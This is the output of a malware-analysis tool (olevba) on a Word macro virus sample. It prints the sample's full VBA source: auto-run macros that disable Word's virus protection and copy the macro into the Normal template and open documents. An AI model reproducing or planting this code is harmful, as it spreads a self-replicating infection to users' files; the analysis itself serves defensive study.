olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nohate.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nohate.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NoNoHate_A.bas 
in file: Virus.MSWord.Nohate.a - OLE stream: 'Macros/VBA/NoNoHate_A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
End Sub
Sub AutoOpen()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoNew()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Function Virus()
    On Error Resume Next
    E
End Function
Function E()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Dim A, B As String
    A = Application.NormalTemplate.FullName
    B = Application.ActiveDocument.FullName
    Application.OrganizerDelete A, "Hate_A", wdOrganizerObjectProjectItems
    Application.OrganizerDelete B, "Hate_A", wdOrganizerObjectProjectItems
    Application.OrganizerCopy A, B, "NoNoHate_A", wdOrganizerObjectProjectItems
    Application.OrganizerCopy B, A, "NoNoHate_A", wdOrganizerObjectProjectItems
End Function

Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
    ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+----------+--------------------+---------------------------------------------+

